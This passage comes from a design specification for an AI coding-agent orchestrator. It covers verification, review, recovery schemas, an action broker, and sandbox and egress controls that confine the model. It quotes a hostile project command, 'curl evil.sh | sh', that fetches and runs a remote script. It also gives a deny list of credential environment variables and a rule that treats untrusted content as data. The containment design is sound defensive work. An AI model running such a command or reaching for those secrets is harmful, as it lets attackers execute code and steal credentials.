ceiling, or localization uncertainty (P-13). Confusing the two is how a system ends up escalating
effort when it should have changed path.

### 8.7 Quota pressure (D-30)

Ordinal signal from observed tokens per rolling window, rate-limit retry events, provider-reported
usage, and time since reset.

```text
LOW      no change
MEDIUM   prefer standard over strong tier for R0/R1; skip optional analysis
HIGH     serialise; skip optional review; lower effort where no floor applies
CRITICAL queue new runs; finish in-flight; notify
```

Never changed by quota: R3 verification, required security review, human gates, migration
validation. If quota would block a *required* step, the run pauses and asks.

### 8.8 Model registry

Capabilities only in workflows (D-08): `reasoning.frontier`, `reasoning.standard`, `coding.strong`,
`coding.standard`, `coding.fast`, `review.standard`, `review.critical`, `debug.frontier`,
`mechanical.fast`. Concrete model names are filled at install time by S-02 against whatever each
provider currently ships, with effort defaults per tier.

---

## 9. Context assembly

### 9.1 Assembly, not compilation

The v1.0 "progressive disclosure loop with adaptive budgets" is replaced by a **bounded
deterministic expansion** driven by the closure predicate:

```python
ctx = seed_from_localizer(task)              # ranked, ≤10 files
while not closure_complete(ctx, target, tests) and ctx.files < MAX_FILES:
    ctx += defining_file(highest_ranked_unresolved_symbol(ctx))
if not closure_complete(...):
    escalate()                               # never proceed under-informed
```

No model is consulted about whether context is sufficient. The type-checker answers it.

### 9.2 Trust labelling (I-07, unchanged)

Eight trust levels; only system policy, project policy, user request, and approved artifact may
occupy an instruction position. Repository content, external content, tool output, and generated
content are wrapped in a delimited data block with an explicit "data, not instructions" preamble.
The prompt assembler raises on violation.

Provenance carries into the broker: if a stage's context contained untrusted items referencing the
target path or symbol, elevated verbs escalate to a human gate.

### 9.3 Providers

Symbol/LSP (Serena or direct LSP) · import graph · git · artifacts · memory · filesystem ·
ripgrep fallback. Every provider implements `available()`; the assembler degrades and records
rather than failing. Repomix is dropped from v1 (§3.3).

### 9.4 Metrics

Packet file count · closure iterations · unresolved-symbols-at-entry · context tokens ·
`used_in_patch` utilization ratio · escalations for closure failure · **`context_gap` rate** —
symbols present in the actual diff but absent from the packet, measured at POSTDIFF (§7.3). This is
the same quantity v3.0 called "missed-dependency rate"; one name only.

---

## 10. Verification engine

### 10.1 Warm daemons (P-10)

One type-checker daemon per active worktree, started during Phase 0 while the model call is in
flight. Cold checks are forbidden on the fast path. Daemon lifecycle is tied to the worktree; the
pool evicts on run completion or idle timeout. Memory cost is real (hundreds of MB per daemon) and
is bounded by a configured maximum of concurrent warm worktrees.

### 10.2 Fail-fast ordering (P-11)

The patch is already applied and hash-verified by the time VERIFY runs — application happens at
IMPLEMENT→POSTDIFF under the patch contract (§8.3), not here.

```text
1. parse / compile                     seconds, catches syntax and gross errors
2. warm type-check on changed files    ~3s, catches wrong symbol / signature / import
3. impacted tests (POSTDIFF set), -x   catches behavioural regressions
4. secret scan on diff                 always, cheap
‖  lint / SAST                          parallel, non-blocking until the above pass
```

Abort on first hard failure and go straight to repair with that evidence. Do not run the remaining
checks to "collect more findings" — it costs time and the first failure is usually the cause.

### 10.3 Risk-adaptive matrix

| Check | R0 | R1 | R2 | R3 |
|---|:--:|:--:|:--:|:--:|
| Parse / compile | ✓ | ✓ | ✓ | ✓ |
| Warm type check | if code | ✓ | ✓ | ✓ |
| Impacted tests | ✓ | ✓ | ✓ (+ full on floor) | full relevant suite |
| Full relevant suite | — | on fail-safe trigger | ✓ | ✓ |
| Integration / contract | — | if relevant | ✓ | ✓ |
| Secret scan on diff | ✓ | ✓ | ✓ | ✓ |
| Dependency scan | on dep change | on dep change | ✓ when affected | ✓ |
| Lint | ‖ | ‖ | ✓ | ✓ |
| SAST | — | ‖ optional | risk-triggered | ✓ security-sensitive |
| Property-based | — | — | risk-triggered | invariant paths |
| Fuzzing | — | — | parser/security paths | risk-triggered |
| Race detector | — | — | concurrency | concurrency |
| Migration dry-run | — | — | schema changes | mandatory |
| Mutation testing | — | — | selected modules | selected modules |
| Performance | — | — | perf-sensitive | perf/availability-sensitive |

### 10.4 Evidence and flakiness

Every check writes stdout/stderr, exit code, duration, and machine-readable output (JUnit XML,
SARIF, JSON) under `run/evidence/<check_id>/`. `READY` reads this table, never a model's claim
(I-06).

A failing check re-runs once on the unchanged tree. Inconsistent results mark `flaky=1`, do not
consume the repair budget, and surface in the summary. Three consecutive flaky observations for the
same check raise a persistent project warning.

### 10.5 Test generation

R0/R1: no test generation. Existing impacted tests are the oracle.
R2: independent test plan, builder writes code and tests, reviewer identifies gaps.
R3: independent executable oracle tests for objectively specifiable behaviour — authorization
matrices, idempotency, data invariants, destructive operations. All generated tests are executed; a
test that does not run is not evidence (D-26).

---

## 11. Review and adjudication

### 11.1 When review runs (P-14)

| Class | Review |
|---|---|
| R0 | Never |
| R1 | **Only when a deterministic finding exists** — a failing check, a type error, a SAST hit, a secret-scan hit, or a floor that fired. The model triages and explains that finding; it does not free-form opine on a passing diff. |
| R2 | One strong reviewer, fresh context (forked session), + specialist for the triggered dimension only |
| R3 | Strong general reviewer + relevant specialist + independent second-model confirmation for BLOCKER/HIGH and critical invariants |

Rationale: on small correct diffs an LLM reviewer's precision is low enough that its false
positives, fed into an auto-fix loop, are a net regression risk. Its genuine strength is
*explaining and triaging deterministic findings* and *filtering static-analysis false positives* —
so that is what it is used for at R1.

### 11.2 Diff-size ceiling (P-15)

The ceiling is enforced **at POSTDIFF as an escalation trigger**, not at review time: a fast-path
patch exceeding ~400 changed lines leaves the fast path before it is verified, and the run either
splits into smaller tasks or enters the heavy path. Review reliability degrades sharply with diff
size for humans and models alike, so forcing small diffs is a better quality lever than adding
reviewers — and it reduces context cost at the same time.

### 11.3 Reviewer packet (heavy path)

Include: original task, acceptance criteria, approved design constraints, risk vector, security and
data invariants, final diff, relevant surrounding source, test plan, verification evidence.

Exclude by default: builder discussion, self-evaluation, rationalisation, failed internal attempts.
Retrievable as evidence on request.

Context independence is the enforced property; provider diversity is a preference for R2/R3 where
available. The forked session shares the cached prefix but appends only the diff and the
independent test plan — independence of *reasoning*, not wasteful independence of *tokens*.

### 11.4 Finding lifecycle (D-28)

```text
PROPOSED → VALIDATED | REJECTED | UNCERTAIN → FIXED → REVERIFIED
```

- Reproducible evidence (failing test, scanner hit, exploitable path) → `VALIDATED`.
- Contradicted by executed evidence → `REJECTED`, with the contradicting evidence stored.
- `UNCERTAIN` at R3 escalates to an independent adjudicator; at R0–R2 it is recorded and surfaced
  but does not block.
- **No fix from an unadjudicated finding.** Only `VALIDATED` findings enter the repair loop.
- Every fix triggers re-verification before `READY`.

### 11.5 Hard-bug workflow (heavy path)

Diagnosis is read-only and parallel; patching during diagnosis is prohibited. Two independent
diagnoses (different providers where available) → hypothesis comparison → targeted experiments →
reproduced root cause → **regression test demonstrated failing on the pre-fix tree** → minimal fix
→ verification → review. A test that never failed is not a regression test.

---

## 12. State, storage, and recovery

### 12.1 Fast-path states — a minimal linear FSM

The fast path is not "not an FSM". It has durable states, guards, retries, checkpoints, and
recovery. It is a **minimal linear FSM**, distinguished from the heavy FSM by having fewer states
and no model-driven stages — not by being informal.

```text
   PREPARE ──► IMPLEMENT ──► POSTDIFF ──► VERIFY ──► READY
      │                         ▲            │
      │                         │            └── fail, repairs left ──► REPAIR
      │                         │                                          │
      │                         └──────────────────────────────────────────┘
      │                                   (repair output re-enters POSTDIFF — I-19)
      │
      └──► ESCALATED ◄── POSTDIFF: class promoted · force_heavy · context gap · size ceiling
                     ◄── PREPARE:  closure unsatisfiable · preflight ≥ R2
                     ◄── VERIFY:   failure with no repairs left

   any state ──► BLOCKED_HUMAN  (mandatory gate, or ambiguous external action at recovery)
```

Two properties this diagram encodes and v3.0 did not: **`REPAIR` has exactly one successor, and it
is `POSTDIFF`** (P-28, I-19); and **class promotion at POSTDIFF restores the pre-IMPLEMENT
checkpoint before handing off**, so the heavy path starts from base with the rejected patch as
evidence, never as a foundation.

### 12.2 Transition guards

Fast-path and heavy-path guards are kept in **separate tables** so a fast-path repair cannot inherit
heavy-path semantics or vice versa. All guards are model-free (I-01).

```text
DISCOVER → CLASSIFY → DESIGN → CHALLENGE → IMPLEMENT → VERIFY → REVIEW → READY   (heavy)
```

**Fast path**

| From | To | Guard |
|---|---|---|
| `PREPARE` | `IMPLEMENT` | closure predicate holds; preflight class ≤ R1; no `force_heavy` floor; worktree + base SHA recorded; **pre-IMPLEMENT checkpoint written** |
| `PREPARE` | `ESCALATED` | preflight class ≥ R2, `force_heavy` floor, or closure unsatisfiable within budget |
| `IMPLEMENT` | `POSTDIFF` | patch schema-valid; every `expected_base_blob_sha` matched; Broker apply succeeded; every `expected_result_sha` matched (I-20) |
| `POSTDIFF` | `VERIFY` | **aggregate** post-diff class ≤ R1; diff ≤ size ceiling; TIA, closure, and `context_gap` recomputed from the actual aggregate diff |
| `POSTDIFF` | `ESCALATED` | post-diff class ≥ R2, `force_heavy` on actual paths, `context_gap` non-empty, or size ceiling exceeded — **`rollback_to_checkpoint(pre_implement_cp)` first** (§12.4), patch carried as evidence only |
| `VERIFY` | `READY` | stored `VerificationReport.status == pass`; no unresolved deterministic finding |
| `VERIFY` | `REPAIR` | failing check and `repair_count == 0` |
| `REPAIR` | `POSTDIFF` | repair patch schema-valid; hash-guarded apply succeeded; **aggregate** diff against the original base recomputed (I-19) |
| `VERIFY` | `ESCALATED` | verification fails after a repaired POSTDIFF (`repair_count >= 1`) |

**Heavy path**

| From | To | Guard |
|---|---|---|
| `CLASSIFY` | `DESIGN` | `RiskAssessment` stored; class ≥ R2 |
| `DESIGN` | `CHALLENGE` | `Design` + `TestSpecification` stored |
| `CHALLENGE` | `IMPLEMENT` | challenges resolved or explicitly accepted; implementation contract stored |
| `IMPLEMENT` | `VERIFY` | `ChangeSet` stored; workspace SHA recorded; current risk assessment stored |
| `VERIFY` | `REVIEW` | verification passed; class ≥ R2 |
| `REVIEW` | `IMPLEMENT` | ≥1 finding adjudicated `VALIDATED` with severity ≥ HIGH |
| `REVIEW` | `READY` | no open VALIDATED findings ≥ HIGH; final verification passed |

**Global**

| From | To | Guard |
|---|---|---|
| `*` | `BLOCKED_HUMAN` | Broker raised a mandatory gate, or recovery found an ambiguous external action |

**Escalation rule:** if a risk recompute raises the class above the planned path, the run re-enters
classification and re-plans. The only backward transition that is not a repair loop.

### 12.3 Checkpoint protocol (I-08)

One SQL transaction per boundary:

```text
BEGIN IMMEDIATE
  insert artifacts (hashes; blobs already fsync'd to CAS via tmp+rename)
  insert worker_calls + usage + cache-health rows
  update run.current_state, run.workspace_sha, run.workspace_generation
  insert stage_attempt result
  insert event 'stage.completed'
  insert checkpoint (state, worktree SHA, artifact set, risk vector,
                     workspace_generation,
                     action_attempt_watermark = MAX(attempt_seq) among attempts
                       of this run in this generation whose effect is represented
                       by the tree being checkpointed)
COMMIT
```

Blob rule: write to `artifacts/tmp/<uuid>`, fsync, rename into CAS, *then* record the hash inside
the transaction. A crash leaves an orphan blob (GC'd), never a dangling reference.

### 12.4 Recovery

**One rollback primitive, used everywhere.** Crash recovery and POSTDIFF class promotion are the
same operation and must not have two implementations. v5.1 described promotion as "restore the
pre-IMPLEMENT checkpoint" without connecting it to generation handling, which would have left
promotion with the exact inconsistency recovery was fixed to prevent.

```python
def rollback_to_checkpoint(cp: Checkpoint) -> None:
    old_gen = run.workspace_generation
    git_reset_hard(worktree, cp.workspace_sha)          # aidev worktree only, never the user's
    void_workspace_local_attempts(
        run_id=run.id,
        generation=old_gen,                              # the epoch being abandoned
        seq_gt=cp.action_attempt_watermark,              # POSITION inside it
    )
    run.workspace_generation = old_gen + 1
    emit("workspace.rolled_back", checkpoint=cp.id, from_generation=old_gen)
```

**The cut is `generation == old_gen AND attempt_seq > cp.action_attempt_watermark`.** Attempts at or
below the watermark are *represented by the checkpoint*: their effects survive the reset and must
keep their recorded state. v5.1 cut on generation alone and therefore voided them too:

```text
generation 0
  attempt_seq 7   fs.write A   SUCCEEDED     ← represented by checkpoint C
  checkpoint C    watermark = 7
  attempt_seq 8   fs.write B   SUCCEEDED     ← NOT in C
  crash → rollback_to_checkpoint(C)

correct : A stays SUCCEEDED (its effect is in the tree) · B is voided
v5.1    : both voided — A is re-derived although it already exists
```

Recovery, on daemon start, for each non-terminal run:

1. **Scan `action_attempt` for non-terminal attempts before touching any run** (P-23). Reconcile
   content-addressable and idempotent effects automatically; halt any run holding an `UNKNOWN`
   **external** attempt in `BLOCKED_HUMAN` with a reconciliation prompt.
2. Load the newest checkpoint.
3. If worktree `HEAD` ≠ `checkpoint.workspace_sha`, call `rollback_to_checkpoint(cp)` and log
   `workspace.reconciled`. If they already match, no rollback occurs and **nothing is voided** —
   attempts after the watermark with a non-terminal state are reconciled by their per-verb strategy,
   not discarded.
4. **Voided attempts** (P-39, I-25) are workspace-local only, and voiding applies **even at
   `SUCCEEDED`** — their outcome described a tree the reset erased. A voided action is re-derived
   from intent under a new `attempt_seq` in the new generation. History is retained, never deleted.
5. **External attempts are generation-independent.** A network POST or a package publish left the
   machine; no local rollback can undo it, so its terminal state stands and an `UNKNOWN` still halts
   the run. This asymmetry is the whole point of `effect_scope`.
6. Reap orphaned worker PIDs with no terminal event; mark `interrupted`; evict their sessions.
7. Resume at the checkpoint state with `attempt_no + 1`. Session cache is cold after a restart —
   record the re-write cost rather than hiding it.
8. If the worktree is gone, mark `FAILED` with `reason=workspace_lost`, keep all artifacts.

### 12.5 Schema additions over v1.0

The v1.0 DDL stands, with these changes:

```sql
-- workspace generation: incremented on every rollback of the run worktree (P-39).
-- The generation is an EPOCH. The watermark is the POSITION inside it: the highest
-- action_attempt.attempt_seq whose effect is represented by that checkpoint. v5.1 voided on
-- generation alone, which destroyed effects the checkpoint already contained.
ALTER TABLE run        ADD COLUMN workspace_generation INTEGER NOT NULL DEFAULT 0;
ALTER TABLE run        ADD COLUMN next_attempt_seq     INTEGER NOT NULL DEFAULT 1;
ALTER TABLE checkpoint ADD COLUMN workspace_generation INTEGER NOT NULL DEFAULT 0;
ALTER TABLE checkpoint ADD COLUMN action_attempt_watermark INTEGER NOT NULL DEFAULT 0;

-- worker_invocation gains session and cache columns
ALTER TABLE worker_invocation ADD COLUMN session_key TEXT;
ALTER TABLE worker_invocation ADD COLUMN prefix_hash TEXT;
ALTER TABLE worker_invocation ADD COLUMN forked_from TEXT;

-- usage gains explicit cache accounting (P-17)
ALTER TABLE usage ADD COLUMN cache_read_tokens INTEGER;
ALTER TABLE usage ADD COLUMN cache_creation_tokens INTEGER;

-- phase-level latency accounting from M0 (P-18)
CREATE TABLE phase_timing (
  id TEXT PRIMARY KEY, run_id TEXT NOT NULL REFERENCES run(id),
  phase TEXT NOT NULL,          -- prepare|localize|assemble|implement|postdiff|verify|repair|review
  segment TEXT NOT NULL,        -- startup|static|model|tool|test|typecheck|orchestration
  started_at TEXT NOT NULL, duration_ms INTEGER NOT NULL
);
CREATE INDEX idx_phase_run ON phase_timing(run_id, phase);

-- static analysis outcomes, for tuning without re-running
CREATE TABLE localization_result (
  id TEXT PRIMARY KEY, run_id TEXT NOT NULL REFERENCES run(id),
  candidate_path TEXT NOT NULL, rank INTEGER NOT NULL, score REAL,
  signals_json TEXT NOT NULL,   -- which signals contributed
  used_in_patch INTEGER,        -- utilization telemetry; NOT correctness ground truth (P-33)
  gold_relevant INTEGER         -- nullable; independent label, when one exists
);
```

```sql
-- action journal (P-23)
-- LOGICAL action: durable identity and intent (P-35). One row per logical action.
CREATE TABLE action_journal (
  id TEXT PRIMARY KEY, run_id TEXT NOT NULL REFERENCES run(id),
  action_id TEXT NOT NULL,             -- durable logical identity across retry/recovery
  stage_attempt_id TEXT, verb TEXT NOT NULL,
  effect_scope TEXT NOT NULL,          -- workspace_local | external   (P-39)
  idempotency_key TEXT NOT NULL UNIQUE,  -- H(run_id, action_id)
  canonical_args_hash TEXT NOT NULL, args_json TEXT NOT NULL,
  reconcile_strategy TEXT NOT NULL,    -- hash|idempotent|probe|external_halt
  intended_hash TEXT,                  -- for content-addressable writes
  planned_at TEXT NOT NULL,
  UNIQUE(run_id, action_id)
);

-- ATTEMPT: one row per execution of that logical action, bound to a workspace generation.
-- A SUCCEEDED workspace-local attempt describes a world that a later rollback can erase (P-39).
CREATE TABLE action_attempt (
  id TEXT PRIMARY KEY,
  action_id TEXT NOT NULL, run_id TEXT NOT NULL REFERENCES run(id),
  workspace_generation INTEGER NOT NULL,
  attempt_seq INTEGER NOT NULL,        -- monotonic per run; POSITION within the epoch (P-39)
  state TEXT NOT NULL,                 -- planned|authorized|started|succeeded|failed|unknown|void
  authorized_at TEXT, started_at TEXT, ended_at TEXT,
  observed_outcome_json TEXT, reconciled_at TEXT, reconciled_by TEXT,
  FOREIGN KEY (run_id, action_id) REFERENCES action_journal(run_id, action_id),
  UNIQUE(run_id, attempt_seq)
);
CREATE INDEX idx_attempt_open ON action_attempt(state)
  WHERE state IN ('authorized','started','unknown');
CREATE INDEX idx_attempt_cut ON action_attempt(run_id, workspace_generation, attempt_seq);

-- local trust root (P-22)
CREATE TABLE trusted_content (
  id TEXT PRIMARY KEY, project_id TEXT NOT NULL REFERENCES project(id),
  rel_path TEXT NOT NULL,              -- .aidev/project.toml, .aidev/memory/foo.md
  content_hash TEXT NOT NULL,
  approved_at TEXT NOT NULL, approved_by TEXT NOT NULL,
  supersedes TEXT,                     -- prior hash, for audit
  UNIQUE(project_id, rel_path, content_hash)
);

-- two-phase assessment (P-19)
-- assessments are APPEND-ONLY. A repaired run has postdiff #1, then postdiff #2 after
-- REPAIR → POSTDIFF (I-19). v5.0's UNIQUE(run_id, phase) made the second insert fail or
-- clobber the first, destroying the answer to "why was the first patch R1 and the repair R2?" (P-38)
CREATE TABLE assessment (
  id TEXT PRIMARY KEY, run_id TEXT NOT NULL REFERENCES run(id),
  stage_attempt_id TEXT REFERENCES stage_attempt(id),
  phase TEXT NOT NULL,                 -- preflight | postdiff
  ordinal INTEGER NOT NULL,            -- 1-based, per (run, phase)
  supersedes TEXT REFERENCES assessment(id),   -- prior ordinal, for the chain
  derived_class TEXT NOT NULL, risk_vector_json TEXT NOT NULL,
  facts_json TEXT NOT NULL,            -- PreflightFacts or PostDiffFacts
  floors_json TEXT, force_heavy INTEGER NOT NULL DEFAULT 0,
  context_gap_json TEXT,               -- postdiff only
  aggregate_base_sha TEXT,             -- postdiff: the base the aggregate diff was taken against
  created_at TEXT NOT NULL,
  UNIQUE(run_id, phase, ordinal)
);

-- environment provisioning (P-26, P-31)
CREATE TABLE environment (
  id TEXT PRIMARY KEY, project_id TEXT NOT NULL REFERENCES project(id),
  env_key TEXT NOT NULL,               -- platform-complete fingerprint hash (P-31)
  fingerprint_json TEXT NOT NULL,      -- canonical inputs that produced env_key
  kind TEXT NOT NULL,                  -- venv|node_modules|cargo|package-store|...
  store_path TEXT NOT NULL, provisioned_at TEXT NOT NULL,
  validated_at TEXT,                   -- NULL until import/runtime validation passed
  last_used_at TEXT, size_bytes INTEGER,
  UNIQUE(project_id, env_key, kind)
);

-- environment leases: eviction may never reclaim an env a live run depends on (§15A)
CREATE TABLE env_lease (
  id TEXT PRIMARY KEY, environment_id TEXT NOT NULL REFERENCES environment(id),
  run_id TEXT NOT NULL REFERENCES run(id),
  acquired_at TEXT NOT NULL, released_at TEXT,
  UNIQUE(environment_id, run_id)
);
CREATE INDEX idx_lease_active ON env_lease(environment_id) WHERE released_at IS NULL;
```

`used_in_patch` is cheap online **utilization telemetry**, not ground truth: the model's patch is
conditioned on the localizer, so scoring the localizer by patch membership is circular (P-33).
Correctness is tuned against `gold_relevant` — historical accepted edits, human labels, or hidden
dependency evidence — populated only for eval and historical cases. Use `used_in_patch` to
understand waste and model uptake, never to claim precision.

### 12.6 Event taxonomy additions

`session.opened|forked|evicted|expired` · `prefix.built|hit|miss|invalidated` ·
`static.localized|closure_satisfied|closure_failed` · `assessment.preflight|postdiff|promoted` ·
`tia.selected|recomputed|failsafe` · `typecheck.daemon_started|ready` ·
`action.planned|authorized|started|succeeded|failed|unknown|reconciled` ·
`trust.proposed|approved|rejected|changed` · `env.provisioned|reused|evicted` ·
`escalation.fastpath_exit` — alongside the v1.0 set.

---

## 13. Workspace manager

- Branch `aidev/run-<short_id>` from the resolved base commit; worktree under
  `~/.aidev/workspaces/<project-id>/run-<short_id>/primary`; scratch sibling exported as TMPDIR.
- **Dirty tree (D-06):** base is always committed `HEAD`; record `dirty_base=1`; list excluded paths;
  tell the user once. Never stash, commit, reset, checkout, or clean the user's tree. An
  include-working-copy mode is v1.1 and must provably never touch the index.
- Refuse to start on: unresolved merge/rebase, unborn HEAD, non-repository path.
- **Logically** quarantine repo-supplied agent config before any project-bound worker starts (§8.5,
  P-36) — inventoried and hashed, never physically removed, never re-enabled (P-41).
- All worktree resets go through `rollback_to_checkpoint()` (§12.4); no other code path may reset.
- Checkpoint commits inside the run worktree at each boundary; squashed on hand-off unless the user
  keeps history.
- `aidev diff|apply|gc`; removal via `git worktree remove` + `prune`, never `rm -rf` on a path the
  daemon did not create.

---

## 14. Action Broker and sandboxing

Normative, not summary. Argv-only execution, read and write root enforcement, durable action
identity, generation-scoped local effects, and the egress split are **structural** boundaries —
properties of how processes are spawned and which capabilities exist at all, not instructions a
model is asked to respect.

### 14.1 Verbs

`fs.read` · `fs.write` · `fs.delete` · `proc.exec` · `git.read` · `git.write` · `net.fetch` ·
`pkg.install` · `secret.read` · `mcp.call`. Defaults: allow inside the worktree, deny outside;
network deny; secrets deny (mandatory gate, no policy override); MCP allowlisted servers only, and
none at all on the fast path (P-16).

### 14.2 Decision pipeline

```python
def decide(req: ActionRequest, ctx: RunContext) -> Decision:
    if req.verb in FROZEN_DENY:                     return deny("frozen_invariant")
    args = canonicalise(req.args)                   # realpath, symlinks, reject traversal
    if not within_allowed_roots(args, ctx):         return deny("path_outside_workspace")
    if violates(ctx.policy, req):                   return deny("policy")
    if req.influenced_by_untrusted and req.verb in ELEVATED_VERBS:
        return gate("untrusted_influence")
    if req.verb in MANDATORY_GATE_VERBS:            return gate("mandatory")
    if ctx.risk.derived_class == "R3" and req.verb in R3_GATE_VERBS:
        return gate("risk_class")
    return allow()
```

Every decision — allow, deny, gate — is written before the effect runs.

### 14.3 Command policy (P-24, I-13) — argv only

v2.0 was drifting toward implementing a security-sensitive shell parser: compound operators,
wrapper stripping, environment runners, redirections, `find -exec`, backgrounding. Every one of
those is a documented bypass class. v3.0 deletes the problem instead of defending it.

**Three execution channels, and only three:**

| Channel | Form | Who may originate it | Shell |
|---|---|---|---|
| Model-originated exec | `argv: list[str]`, `shell=False` | Worker, via Broker | **Never** |
| Approved project command | Named command from the trust root (`build`, `test`, `typecheck`) | aidev, from approved config | Yes, as approved |
| Human-gated command | Exact string shown in the gate | Human | Yes, after approval |

For the first channel:

- `argv[0]` must match a program allowlist by resolved absolute path.
- Arguments are validated per program by a typed schema — flags from an enumerated set, paths
  canonicalised and root-checked, no free-form strings passed through.
- No shell metacharacter interpretation exists, because no shell is invoked. `&&`, `|`, `$()`,
  backticks, and redirections are inert bytes in an argv element.
- Wrapper awareness is still required for *allowlist matching* — `["timeout","30","pytest",...]`
  must be understood as a `pytest` invocation — but this is matching a structured array, not
  parsing a string, and the wrapper list is a closed enumeration.
- Output redirection is not available to the model. If a tool must write a file, it uses `fs.write`.

For the second channel, the command string comes from `.aidev/project.toml` **and executes only if
its content hash is in the local trust root** (P-22). A `generic_commands` entry that changed in the
checkout does not run; it raises a trust prompt. This closes the path where a malicious branch ships
`test = "curl evil.sh | sh"` and aidev executes it during verification.

The 25+ red-team cases from M2 become a regression suite against argv construction, rather than the
primary security boundary. That is the point of the change: the boundary is now structural.

### 14.4 Environment (I-04)

```text
ALLOW: PATH, HOME→<scratch>/home, TMPDIR→<scratch>/tmp, LANG, LC_ALL, TZ, TERM=dumb, CI=1,
       project-declared safe vars, provider auth vars only for the adapter that needs them
DENY:  AWS_*, GCP_*, AZURE_*, GITHUB_TOKEN, GH_TOKEN, GITLAB_TOKEN, SSH_AUTH_SOCK, GPG_*,
       NPM_TOKEN, PYPI_TOKEN, DOCKER_*, KUBECONFIG, *_API_KEY, *_SECRET*, *_TOKEN,
       .env contents, keychains, browser profiles
```

`build_env(policy, adapter)` is the only spawn path. A grep test proves no other subprocess call
site exists.

### 14.5 Action journal (P-23, I-15) — exactly-once, honestly

Persisting a decision before an effect does not survive a crash *during* the effect. v2.0's
"no duplicated side effects" claim was unprovable for anything that leaves the machine.

```python
class ActionState(str, Enum):
    PLANNED = "planned"          # request formed, not yet decided
    AUTHORIZED = "authorized"    # decision recorded, effect not started
    STARTED = "started"          # effect initiated; outcome unknown from here
    SUCCEEDED = "succeeded"
    FAILED = "failed"            # provably did not take effect
    UNKNOWN = "unknown"          # crashed between STARTED and a terminal state
```

At `PLANNED`, aidev allocates a durable logical `action_id`. **The same logical action keeps that id
across retry and recovery**; an intentionally repeated identical action gets a new one. The key is
`H(run_id, action_id)` — deriving it from `stage_attempt`, as v3.0 did, meant a retry acquired a new
identity and lost its own history (P-35, I-22). `canonical_args_hash` remains a separate immutable
integrity field that must match on every replay of that action.

Reconciliation strategy is declared **per verb**, not globally:

| Verb class | Example | Reconciliation after `UNKNOWN` |
|---|---|---|
| Content-addressable write | `fs.write` | Compare file hash to intended hash → derive SUCCEEDED or FAILED; safe to replay |
| Idempotent local | `fs.delete`, `git.write(branch)` | Check current state; replay is harmless |
| Non-idempotent local | `git.write(commit)` | Check for the commit by message trailer + tree hash before replaying |
| External, idempotent-with-key | provider API call carrying the key | Query by key if the provider supports it; else treat as external |
| **External, non-idempotent** | network POST, package publish, spend, email, production action | **Never replayed. The run halts in `BLOCKED_HUMAN` with an explicit reconciliation prompt** naming the action, its key, and how to check whether it happened |

**Effect scope decides what a rollback means** (P-39). Every logical action declares
`effect_scope = workspace_local | external`:

- **`workspace_local`** — `fs.write`, `fs.delete`, checkpoint commits inside the run worktree. Its
  recorded outcome is only true *within a workspace generation*. A rollback voids it (§12.4 step 4),
  even at `SUCCEEDED`, and the action is re-derived from intent.
- **`external`** — anything that left the machine. No local rollback can undo it, so its terminal
  state is permanent and an `UNKNOWN` halts the run for human reconciliation.

On daemon restart, recovery (§12.4) scans attempts before resuming any run. Content-addressable and
idempotent effects reconcile automatically and log the resolution. Non-idempotent external effects
stop the run. This is the only defensible form of the DoD claim: not "exactly once" by magic, but
"never silently twice, never silently assumed, and never inconsistent with the tree".

### 14.6 Egress split (P-25, I-17)

The worker must reach the provider. The code the worker invokes must not reach anything.

```text
aidevd  ── provider credentials, provider egress only ──►  api.provider.com
   │
   └─ spawns adapter parent  (holds auth material, no project code runs here)
          │
          └─ spawns tool/verification processes
                 env: scrubbed (I-04) — no auth material, no tokens
                 network: denied by default; allowlist per project
                 fs: run worktree + scratch only
```

Concretely: provider auth is held by the adapter parent process and never appears in the environment
handed to a tool, a test run, or a build. Where the provider CLI insists on reading credentials from
the environment, the adapter parent is the only process with them, and it never forks a project
command directly — `proc.exec` always goes through a separate spawn path with `build_env()`.

Network policy is asymmetric by design: **control-plane egress to the provider is allowed; tool
egress is denied.** A test that tries to reach the internet fails closed, which is also the correct
behaviour for hermetic testing. Dependency restoration is the one declared exception, and it happens
during environment provisioning (§15A), not during a model-driven stage.

S-08 proves this with canaries, one per mode. **`PATCH_ONLY`** must expose no usable read or exec
surface at all, and must not be able to retrieve a repository canary file or a home-directory canary
that were deliberately omitted from its context packet. **`BROKERED_TOOLS`** must fail to read auth
material, fail to read outside its declared roots, and fail to reach an unapproved host — while the
model call itself succeeds. A provider that cannot pass the canary for a given mode is not granted
that mode (I-17, I-18).

### 14.7 Frozen human gates (I-09)

Production deployment · production credential access · destructive migration · production database
write · cloud infrastructure destruction · external spending · force push · package publication ·
breaking a declared public API · weakening a security policy · any network + secret combination.

Presentation contract — all five fields, every time:

```text
ACTION       what will happen, one line
CONSEQUENCE  what changes in the world, and where
COMMAND      the exact argv or diff hunk
ROLLBACK     the exact undo, or "IRREVERSIBLE"
EVIDENCE     verification results and findings supporting the request
```

No "don't ask again" for the frozen list.

### 14.8 Sandbox

v1 uses provider-native isolation plus broker policy (D-20). **These profiles describe what the
*process* may touch — they are not model tool grants.** Model tool surface is set by execution mode
(§8.3), and on the fast path it is empty. v3.0's table said "IMPLEMENTER: edit + scoped exec", which
contradicted the tool-less fast path; that row was describing aidev's own privileges, not the model's.

"Secrets" is two different things and v5.0 collapsed them, making the adapter parent look like it
violated its own row. **Provider auth** is the credential the adapter needs to reach the model;
**project/user secrets** are everything else (cloud keys, tokens, keychains). They are separate
columns because they live in separate processes (§14.6).

| Role | Process filesystem | Network | Provider auth | Project/user secrets | Model tool surface |
|---|---|---|---|---|---|
| PREPARE (static) | worktree read + env store | provisioning only, Broker-gated | none | deny | **none — no model** |
| ADAPTER PARENT | neutral cwd; no project code runs here | **provider egress only** | **holds it — the only process that does** | deny | n/a — not a model |
| FAST IMPLEMENTER (provider process) | neutral cwd only | via adapter parent | not in its env | deny | **none (P-29)** |
| PATCH APPLIER | run worktree rw | deny | none | deny | **none — aidev, not a model** |
| HEAVY IMPLEMENTER | run worktree rw | via adapter parent | not in its env | deny | `BROKERED_TOOLS` if S-07 proven, else none |
| REVIEWER / ARCHITECT | read-only roots | via adapter parent | not in its env | deny | read-only `BROKERED_TOOLS` if S-07 proven, else none |
| MODEL TOOL / VERIFIER process | worktree rw + env store ro | **deny** (steady state) | **none** | synthetic only | none — aidev runs checks |
| PRODUCTION | — | — | — | — | denied; gate only |

The row that matters for S-08: the adapter parent holds provider auth and never forks a project
command; every `proc.exec` goes through a separate spawn path with `build_env()` (I-04, I-17).

Strict OS backends (bubblewrap, rootless podman, macOS profiles) normally land in M9. They may be
pulled into M7 and made mandatory for R2/R3 as an additional layer — but **availability of a sandbox
